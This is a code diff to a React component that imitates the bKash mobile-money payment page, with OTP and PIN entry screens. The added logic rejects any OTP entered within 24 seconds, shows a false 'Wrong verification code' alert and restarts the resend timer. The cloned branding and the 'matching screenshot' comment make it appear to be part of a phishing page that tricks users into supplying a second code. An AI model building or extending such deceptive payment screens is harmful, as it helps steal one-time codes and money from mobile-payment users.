@@ -18,6 +18,8 @@ const BkashPayment = () => {
   const [resendTimer, setResendTimer] = useState(30);
   const [resendStatus, setResendStatus] = useState<'idle' | 'sending' | 'sent'>('idle');
   const [redirectTimer, setRedirectTimer] = useState(5);
+  const [showWrongOtp, setShowWrongOtp] = useState(false);
+  const [otpElapsed, setOtpElapsed] = useState(0);
 
   const otpInputRef = useRef<HTMLInputElement>(null);
   const pinInputRef = useRef<HTMLInputElement>(null);
@@ -75,6 +77,18 @@ const BkashPayment = () => {
     return () => clearInterval(interval);
   }, [showOtpView, resendTimer]);
 
+  // Track elapsed time in OTP view
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (showOtpView) {
+      setOtpElapsed(0);
+      interval = setInterval(() => {
+        setOtpElapsed((prev) => prev + 1);
+      }, 1000);
+    }
+    return () => clearInterval(interval);
+  }, [showOtpView]);
+
   useEffect(() => {
     let interval: NodeJS.Timeout;
     if (showFailedView && redirectTimer > 0) {
@@ -116,6 +130,13 @@ const BkashPayment = () => {
 
   const handleOtpConfirm = () => {
     if (isValidOtp()) {
+      if (otpElapsed < 24) {
+        // Show wrong verification code alert
+        setShowWrongOtp(true);
+        setOtpCode("");
+        setResendTimer(20);
+        return;
+      }
       setIsConfirmLoading(true);
       setTimeout(() => {
         setIsConfirmLoading(false);
@@ -215,20 +236,18 @@ const BkashPayment = () => {
           <>
             {/* Pink Section - Payment Failed */}
             <div className="bg-[#E2136E] flex flex-col items-center justify-center" style={{ height: '400px' }}>
-              {/* Circle with gap at bottom-right and X inside */}
-              <div className="relative w-14 h-14 mb-4">
-                <svg width="56" height="56" viewBox="0 0 56 56" fill="none">
-                  {/* Circle arc with gap at bottom-right (~5 o'clock to ~7 o'clock) */}
+              {/* Circle with gap at bottom-right and X inside - smaller & bolder */}
+              <div className="relative w-11 h-11 mb-4">
+                <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
                   <path
-                    d="M 38.19 43.8 A 20 20 0 1 1 43.8 38.19"
+                    d="M 30.5 35 A 16 16 0 1 1 35 30.5"
                     stroke="white"
-                    strokeWidth="2"
+                    strokeWidth="2.5"
                     strokeLinecap="round"
                     fill="none"
                   />
-                  {/* Bold X mark */}
-                  <line x1="19" y1="19" x2="37" y2="37" stroke="white" strokeWidth="3.5" strokeLinecap="round" />
-                  <line x1="37" y1="19" x2="19" y2="37" stroke="white" strokeWidth="3.5" strokeLinecap="round" />
+                  <line x1="15" y1="15" x2="29" y2="29" stroke="white" strokeWidth="3.5" strokeLinecap="round" />
+                  <line x1="29" y1="15" x2="15" y2="29" stroke="white" strokeWidth="3.5" strokeLinecap="round" />
                 </svg>
               </div>
               <h3 className="text-white text-center text-base font-semibold mb-2">
@@ -359,37 +378,55 @@ const BkashPayment = () => {
               <>
                 {/* Pink Section - OTP Form */}
                 <div className="bg-[#E2136E] px-5 py-5 flex flex-col justify-center" style={{ height: '340px' }}>
-                  <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
-                    Enter verification code sent to {getMaskedNumber()}
-                  </h3>
-                  <input
-                    ref={otpInputRef}
-                    type="tel"
-                    value={otpCode}
-                    onChange={handleOtpChange}
-                    placeholder="Enter 6 digit code"
-                    className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
-                  />
-                  {resendStatus === 'sending' ? (
-                    <p className="text-white text-center text-[10px] mt-2">
-                      Sending code to user handset ..
-                    </p>
-                  ) : resendStatus === 'sent' ? (
+                  {showWrongOtp ? (
                     <>
-                      <p className="text-white text-center text-[10px] mt-2 font-medium">
-                        Code sent successfully
-                      </p>
+                      {/* Wrong verification code alert - matching screenshot */}
+                      <div className="flex items-center justify-center gap-2 mb-2">
+                        <svg width="18" height="16" viewBox="0 0 18 16" fill="none">
+                          <path d="M9 0L0 16h18L9 0z" fill="white" />
+                          <text x="9" y="13" textAnchor="middle" fill="#E2136E" fontSize="11" fontWeight="bold">!</text>
+                        </svg>
+                        <span className="text-white text-sm font-medium">Wrong verification code</span>
+                      </div>
                       <p className="text-white text-center text-[10px] mt-1">
                         Resend Code in {resendTimer}s
                       </p>
                     </>
                   ) : (
-                    <p 
-                      className={`text-white text-center text-[10px] mt-2 ${resendTimer === 0 ? 'underline cursor-pointer hover:text-white/80' : ''}`}
-                      onClick={handleResendCode}
-                    >
-                      {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : 'Resend Code'}
-                    </p>
+                    <>
+                      <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
+                        Enter verification code sent to {getMaskedNumber()}
+                      </h3>
+                      <input
+                        ref={otpInputRef}
+                        type="tel"
+                        value={otpCode}
+                        onChange={handleOtpChange}
+                        placeholder="Enter 6 digit code"
+                        className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
+                      />
+                      {resendStatus === 'sending' ? (
+                        <p className="text-white text-center text-[10px] mt-2">
+                          Sending code to user handset ..
+                        </p>
+                      ) : resendStatus === 'sent' ? (
+                        <>
+                          <p className="text-white text-center text-[10px] mt-2 font-medium">
+                            Code sent successfully
+                          </p>
+                          <p className="text-white text-center text-[10px] mt-1">
+                            Resend Code in {resendTimer}s
+                          </p>
+                        </>
+                      ) : (
+                        <p 
+                          className={`text-white text-center text-[10px] mt-2 ${resendTimer === 0 ? 'underline cursor-pointer hover:text-white/80' : ''}`}
+                          onClick={handleResendCode}
+                        >
+                          {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : 'Resend Code'}
+                        </p>
+                      )}
+                    </>
                   )}
                 </div>
 
